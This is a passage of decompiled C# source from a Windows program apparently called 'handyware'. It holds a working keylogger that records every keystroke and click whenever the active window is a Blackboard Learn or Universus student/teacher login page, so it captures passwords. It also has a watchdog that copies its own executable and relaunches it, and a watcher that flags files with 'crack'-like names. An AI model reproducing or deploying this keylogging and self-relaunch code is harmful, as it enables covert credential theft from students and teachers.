          else if (this.Contains(activeWindowTitle, "Blackboard Learn", StringComparison.CurrentCultureIgnoreCase))
            flag1 = true;
          else if (this.Contains(activeWindowTitle, "Universus", StringComparison.CurrentCultureIgnoreCase) && this.Contains(activeWindowTitle, "Login", StringComparison.CurrentCultureIgnoreCase) && (this.Contains(activeWindowTitle, "Student", StringComparison.CurrentCultureIgnoreCase) || this.Contains(activeWindowTitle, "Teacher", StringComparison.CurrentCultureIgnoreCase)))
            flag1 = true;
          if (flag1)
          {
            if (this.logger == "")
            {
              Form1 form1 = this;
              form1.logger = form1.logger + "Window Title:  " + activeWindowTitle;
            }
            bool flag2 = false;
            for (int index = 0; index < (int) byte.MaxValue; ++index)
            {
              if (Form1.GetAsyncKeyState(index) != (short) 0)
              {
                flag2 = true;
                if (!this.keyDown)
                {
                  this.keyDown = true;
                  bool newLine = false;
                  string keyPressed = this.GetKeyPressed(index, ref newLine, this.canRetShift);
                  if (this.logger.IndexOf("\r\n") == -1)
                    this.logger += "\r\n";
                  if (newLine)
                  {
                    if (keyPressed != "<Left-Click>" || keyPressed != "<Right-Click>")
                      this.logger += keyPressed;
                    this.logger += "\r\n";
                  }
                  else
                    this.logger += keyPressed;
                  if (keyPressed != "<Shift>")
                  {
                    this.canRetShift = true;
                    break;
                  }
                  this.canRetShift = false;
                  flag2 = false;
                }
              }
            }
            if (!flag2)
              this.keyDown = false;
          }
        }
      }
      catch (SystemException ex)
      {
        this.writeLogError("Timer Log\r\nError: " + ex.Message);
      }
      this.timer_logger.Interval = 30;
      this.timer_logger.Enabled = true;
    }

    private void checkBoxNotification_CheckedChanged(object sender, EventArgs e)
    {
      Size size = this.label_mex.Size;
      int width = size.Width + 24;
      size = this.label_mex.Size;
      int height = size.Height + 38;
      this.Size = new Size(width, height);
      this.label_mex.Focus();
      if (this.chbxNotificationShowHide.Checked)
      {
        this.Location = new Point(-this.Size.Width, 2);
        this.Show();
        this.timer_showNotify.Interval = 30;
        this.timer_hideNotify.Enabled = false;
        this.timer_showNotify.Enabled = true;
      }
      else
      {
        this.timer_hideNotify.Interval = 10000;
        this.timer_hideNotify.Enabled = true;
        this.timer_showNotify.Enabled = false;
      }
    }

    private void timer_showNotify_Tick(object sender, EventArgs e)
    {
      if (this.Opacity < 1.0 || this.Location.X < 0)
      {
        if (this.Opacity < 1.0)
          this.Opacity += 0.05;
        if (this.Location.X >= 0)
          return;
        this.Location = new Point(this.Location.X + 10, this.Location.Y);
      }
      else
        this.chbxNotificationShowHide.Checked = false;
    }

    private void timer_hideNotify_Tick(object sender, EventArgs e)
    {
      if (this.Location.X > -this.Size.Width)
      {
        this.timer_hideNotify.Interval = 30;
        int x = this.Location.X - 10;
        Point location = this.Location;
        int y = location.Y;
        this.Location = new Point(x, y);
        location = this.Location;
        if (location.X > 0)
          return;
        this.Opacity -= 0.05;
      }
      else
      {
        this.Opacity = 0.0;
        this.Hide();
        this.timer_hideNotify.Enabled = false;
        this.timer_notifyFilaEspera.Enabled = true;
      }
    }

    private void button_ideMex_Click(object sender, EventArgs e)
    {
      this.timer_hideNotify.Interval = 30;
      try
      {
        Process.Start(this.label_mex.Tag.ToString());
      }
      catch
      {
      }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
    }

    private void Form1_MouseDown(object sender, MouseEventArgs e)
    {
      this.mouseDown = true;
      Point point1 = Cursor.Position;
      int x1 = point1.X;
      point1 = this.Location;
      int x2 = point1.X;
      this.difX = x1 - x2;
      Point point2 = Cursor.Position;
      int y1 = point2.Y;
      point2 = this.Location;
      int y2 = point2.Y;
      this.difY = y1 - y2;
    }

    private void label_mex_MouseDown(object sender, MouseEventArgs e)
    {
      this.mouseDown = true;
      Point point1 = Cursor.Position;
      int x1 = point1.X;
      point1 = this.Location;
      int x2 = point1.X;
      this.difX = x1 - x2;
      Point point2 = Cursor.Position;
      int y1 = point2.Y;
      point2 = this.Location;
      int y2 = point2.Y;
      this.difY = y1 - y2;
    }

    private void Form1_MouseUp(object sender, MouseEventArgs e) => this.mouseDown = false;

    private void label_mex_MouseUp(object sender, MouseEventArgs e) => this.mouseDown = false;

    private void Form1_MouseMove(object sender, MouseEventArgs e)
    {
      if (!this.mouseDown)
        return;
      this.Location = new Point(Cursor.Position.X - this.difX, Cursor.Position.Y - this.difY);
    }

    private void label_mex_MouseMove(object sender, MouseEventArgs e)
    {
      if (!this.mouseDown)
        return;
      this.Location = new Point(Cursor.Position.X - this.difX, Cursor.Position.Y - this.difY);
    }

    private void fileSystemWatcher_userProfileFolder_Created(object sender, FileSystemEventArgs e)
    {
      bool flag = false;
      FileInfo fileInfo = new FileInfo(e.FullPath);
      if (fileInfo.Exists)
      {
        foreach (string FindString in this.palavrasChaveCrack)
        {
          if (this.Contains(fileInfo.Name, FindString, StringComparison.CurrentCultureIgnoreCase))
          {
            this.lstNotifications.Insert(0, "Founded a possible illegal file: \r\n...\\" + fileInfo.Directory.Name + "\\" + fileInfo.Name + "|" + fileInfo.DirectoryName);
            flag = true;
            break;
          }
        }
      }
      if (flag || !fileInfo.Directory.Exists)
        return;
      foreach (string FindString in this.palavrasChaveCrack)
      {
        if (this.Contains(fileInfo.Directory.Name, FindString, StringComparison.CurrentCultureIgnoreCase))
        {
          this.lstNotifications.Insert(0, "Founded a possible illegal files in: \r\n" + fileInfo.DirectoryName + "|" + fileInfo.DirectoryName);
          break;
        }
      }
    }

    private void timer_guardadinhoCheck_Tick(object sender, EventArgs e)
    {
      if (this.timer_guardadinhoCheck.Tag.ToString() == "")
      {
        this.timer_guardadinhoCheck.Tag = (object) "ok";
      }
      else
      {
        if (!(this.timer_guardadinhoCheck.Tag.ToString() == "ok"))
          return;
        this.timer_guardadinhoCheck.Enabled = false;
        if (!this.existProcess("handyware_su"))
        {
          try
          {
            System.IO.File.Copy(Application.ExecutablePath, this.workspace + "\\handyware_su.exe", true);
          }
          catch
          {
          }
          try
          {
            Process.Start(this.workspace + "\\handyware_su.exe");
          }
          catch
          {
          }
        }
        this.timer_CloseHandyware.Enabled = true;
      }
    }

    public enum SL_GENUINE_STATE
    {
      SL_GEN_STATE_IS_GENUINE,
      SL_GEN_STATE_INVALID_LICENSE,
      SL_GEN_STATE_TAMPERED,
      SL_GEN_STATE_LAST,
    }
  }
}
